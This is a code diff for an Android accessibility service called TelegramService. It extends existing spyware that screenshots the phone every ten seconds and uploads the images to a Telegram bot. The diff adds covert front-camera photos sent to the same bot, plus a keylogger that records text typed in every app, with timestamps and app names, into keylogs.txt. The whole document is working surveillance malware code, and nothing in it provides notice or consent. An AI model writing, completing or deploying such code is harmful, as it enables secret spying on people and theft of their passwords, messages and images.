@@ -3,10 +3,20 @@ package com.example.telegramsender
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.os.Build
 import android.util.Log
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageCapture
+import androidx.camera.core.ImageCaptureException
+import androidx.camera.core.ImageProxy
+import androidx.camera.lifecycle.ProcessCameraProvider
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.LifecycleOwner
+import androidx.lifecycle.LifecycleRegistry
 import kotlinx.coroutines.*
 import okhttp3.FormBody
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -18,8 +28,7 @@ import java.io.ByteArrayOutputStream
 import java.io.IOException
 import java.util.concurrent.Executor
 
-
-class TelegramService : AccessibilityService() {
+class TelegramService : AccessibilityService(), LifecycleOwner {
 
     private val client = OkHttpClient()
     private var job: Job? = null
@@ -27,10 +36,20 @@ class TelegramService : AccessibilityService() {
     // Default credentials, will be loaded from Prefs
     private var botToken: String = ""
     private var targetChatId: String = ""
+    private var sendCamera: Boolean = false
+    
+    private val lifecycleRegistry = LifecycleRegistry(this)
+    private var imageCapture: ImageCapture? = null
+
+    override fun onCreate() {
+        super.onCreate()
+        lifecycleRegistry.currentState = Lifecycle.State.CREATED
+    }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.d("TelegramService", "Accessibility Service Connected")
+        lifecycleRegistry.currentState = Lifecycle.State.STARTED
         
         loadCredentials()
         
@@ -46,6 +65,7 @@ class TelegramService : AccessibilityService() {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         botToken = pref.getString("token", "") ?: ""
         targetChatId = pref.getString("chatId", "") ?: ""
+        sendCamera = pref.getBoolean("sendCamera", false)
     }
 
     private fun startCaptureLoop() {
@@ -57,10 +77,72 @@ class TelegramService : AccessibilityService() {
                 
                 if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                     captureAndSend()
+                    if (sendCamera) {
+                        captureCameraAndSend()
+                    }
                 }
                 delay(10_000) // 10 seconds delay
             }
         }
+    }
+    
+    private suspend fun captureCameraAndSend() {
+        withContext(Dispatchers.Main) {
+            try {
+                val cameraProviderFuture = ProcessCameraProvider.getInstance(this@TelegramService)
+                cameraProviderFuture.addListener({
+                    val cameraProvider = cameraProviderFuture.get()
+                    
+                    val imageCapture = ImageCapture.Builder()
+                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                        .build()
+
+                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA // Or BACK based on logic
+
+                    try {
+                        cameraProvider.unbindAll()
+                        cameraProvider.bindToLifecycle(
+                            this@TelegramService,
+                            cameraSelector,
+                            imageCapture
+                        )
+                        
+                        imageCapture.takePicture(
+                            ContextCompat.getMainExecutor(this@TelegramService),
+                            object : ImageCapture.OnImageCapturedCallback() {
+                                override fun onCaptureSuccess(image: ImageProxy) {
+                                    val bitmap = imageProxyToBitmap(image)
+                                    image.close()
+                                    if (bitmap != null) {
+                                        CoroutineScope(Dispatchers.IO).launch {
+                                            sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
+                                        }
+                                    }
+                                    // Cleanup
+                                    cameraProvider.unbindAll()
+                                }
+
+                                override fun onError(exception: ImageCaptureException) {
+                                    Log.e("TelegramService", "Camera capture failed", exception)
+                                    cameraProvider.unbindAll()
+                                }
+                            }
+                        )
+                    } catch (exc: Exception) {
+                        Log.e("TelegramService", "Use case binding failed", exc)
+                    }
+                }, ContextCompat.getMainExecutor(this@TelegramService))
+            } catch (e: Exception) {
+                Log.e("TelegramService", "Camera Setup Failed", e)
+            }
+        }
+    }
+    
+    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
+        val buffer = image.planes[0].buffer
+        val bytes = ByteArray(buffer.remaining())
+        buffer.get(bytes)
+        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
     }
 
     private fun captureAndSend() {
@@ -89,7 +171,7 @@ class TelegramService : AccessibilityService() {
                             
                             if (softwareBitmap != null) {
                                 CoroutineScope(Dispatchers.IO).launch {
-                                    sendTelegramPhoto(botToken, targetChatId, softwareBitmap)
+                                    sendTelegramPhoto(botToken, targetChatId, softwareBitmap, "screenshot.jpg")
                                 }
                             }
                         }
@@ -117,11 +199,11 @@ class TelegramService : AccessibilityService() {
         } catch (_: Exception) {}
     }
 
-    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap) {
+    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
         val url = "https://api.telegram.org/bot$token/sendPhoto"
         
         // Resize if too big to avoid socket timeouts
-        val scale = 720f / originalBitmap.width
+        val scale = if (originalBitmap.width > 720) 720f / originalBitmap.width else 1.0f
         val matrix = android.graphics.Matrix()
         matrix.postScale(scale, scale)
         val resizedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
@@ -131,13 +213,15 @@ class TelegramService : AccessibilityService() {
         val byteArray = stream.toByteArray()
         
         // Clean up
-        originalBitmap.recycle()
+        if (originalBitmap != resizedBitmap) {
+             originalBitmap.recycle()
+        }
         resizedBitmap.recycle()
         
         val requestBody = MultipartBody.Builder()
             .setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", chatId)
-            .addFormDataPart("photo", "screenshot.jpg",
+            .addFormDataPart("photo", filename,
                 byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
             .build()
             
@@ -157,7 +241,27 @@ class TelegramService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        // Not used, but required to override
+        if (event == null) return
+
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            val text = event.text.toString()
+            if (text.isNotEmpty()) {
+                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
+                val logEntry = "[$timestamp] [${event.packageName}]: $text\n"
+                appendLogToFile(logEntry)
+            }
+        }
+    }
+    
+    private fun appendLogToFile(logEntry: String) {
+        try {
+            val file = java.io.File(filesDir, "keylogs.txt")
+            java.io.FileWriter(file, true).use { writer ->
+                writer.append(logEntry)
+            }
+        } catch (e: Exception) {
+            Log.e("TelegramService", "Failed to write log", e)
+        }
     }
 
     override fun onInterrupt() {
@@ -167,6 +271,10 @@ class TelegramService : AccessibilityService() {
     
     override fun onUnbind(intent: Intent?): Boolean {
         job?.cancel()
+        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
         return super.onUnbind(intent)
     }
+
+    override val lifecycle: Lifecycle
+        get() = lifecycleRegistry
 }
